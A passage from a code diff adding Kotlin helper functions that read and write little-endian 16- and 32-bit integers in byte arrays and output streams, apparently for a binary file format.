+    private fun u16(b: ByteArray, o: Int) = (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8)
+
+    private fun i32(b: ByteArray, o: Int) =
+        (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8) or
+            ((b[o + 2].toInt() and 0xFF) shl 16) or ((b[o + 3].toInt() and 0xFF) shl 24)
+
+    private fun putI32(b: ByteArray, o: Int, v: Int) {
+        b[o] = v.toByte()
+        b[o + 1] = (v shr 8).toByte()
+        b[o + 2] = (v shr 16).toByte()
+        b[o + 3] = (v shr 24).toByte()
+    }
+
+    private fun putU16(b: ByteArray, o: Int, v: Int) {
+        b[o] = v.toByte()
+        b[o + 1] = (v shr 8).toByte()
+    }
+
+    private fun ByteArrayOutputStream.writeU16(v: Int) {
+        write(v and 0xFF)
+        write((v shr 8) and 0xFF)
+    }
+
+    private fun ByteArrayOutputStream.writeI32(v: Int) {
+        write(v and 0xFF)
+        write((v shr 8) and 0xFF)
+        write((v shr 16) and 0xFF)
+        write((v shr 24) and 0xFF)
     }
 }
